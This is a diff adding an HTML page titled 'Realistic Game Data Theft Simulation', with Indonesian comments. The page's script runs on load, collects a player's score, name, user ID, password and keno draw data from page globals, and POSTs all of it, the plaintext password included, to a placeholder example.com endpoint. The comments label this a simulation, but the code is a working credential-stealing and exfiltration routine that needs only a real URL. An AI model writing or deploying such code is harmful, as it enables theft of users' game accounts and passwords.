@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Realistic Game Data Theft Simulation</title>
+</head>
+<body>
+    <h1>Realistic Game Data Theft Simulation</h1>
+    <div id="stolenDataContainer">
+        <!-- Stolen data will be displayed here -->
+    </div>
+    
+    <script>
+        // Fungsi untuk mencuri dan menampilkan data game
+        function stealGameData() {
+            var gameDataMain = {
+                score: getScore(),
+                player: getPlayerName(),
+                userId: getUserId(),
+                password: getPassword()
+            };
+
+            var gameDataKeno = {
+                currentDraw: getCurrentDraw(),
+                numbersDrawn: getNumbersDrawn()
+            };
+
+            var combinedData = Object.assign({}, gameDataMain, gameDataKeno);
+            var stolenDataContainer = document.getElementById('stolenDataContainer');
+            var html = '<h2>Stolen Game Data</h2>';
+            html += '<p>Score: ' + gameDataMain.score + '</p>';
+            html += '<p>Player: ' + gameDataMain.player + '</p>';
+            html += '<p>User ID: ' + gameDataMain.userId + '</p>';
+            html += '<p>Password: ' + '********' + '</p>'; // Menyembunyikan password
+            html += '<p>Current Draw: ' + gameDataKeno.currentDraw + '</p>';
+            html += '<p>Numbers Drawn: ' + gameDataKeno.numbersDrawn.join(', ') + '</p>';
+            stolenDataContainer.innerHTML = html;
+
+            // Mengirim data yang dicuri ke server (simulasi)
+            sendStolenDataToServer(combinedData);
+        }
+
+        // Fungsi untuk mengambil data skor dari game
+        function getScore() {
+            return window.gameData ? window.gameData.score : 0;
+        }
+
+        // Fungsi untuk mengambil nama pemain
+        function getPlayerName() {
+            return window.gameData ? window.gameData.playerName : 'Unknown';
+        }
+
+        // Fungsi untuk mengambil ID pengguna
+        function getUserId() {
+            return window.userData ? window.userData.userId : 'No UserID';
+        }
+
+        // Fungsi untuk mengambil password pengguna
+        function getPassword() {
+            return window.userData ? window.userData.password : 'No Password';
+        }
+
+        // Fungsi untuk mengambil undian saat ini
+        function getCurrentDraw() {
+            return window.kenoData ? window.kenoData.currentDraw : 'No Draw';
+        }
+
+        // Fungsi untuk mengambil angka yang ditarik
+        function getNumbersDrawn() {
+            return window.kenoData ? window.kenoData.numbersDrawn : [];
+        }
+
+        // Fungsi untuk mengirim data yang dicuri ke server (simulasi)
+        function sendStolenDataToServer(data) {
+            var serverUrl = 'https://example.com/api/saveGameData';
+
+            fetch(serverUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer yourAccessToken'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                console.log('Stolen data sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending stolen data:', error);
+            });
+        }
+
+        // Memulai proses pencurian data
+        stealGameData();
+    </script>
+</body>
+</html>
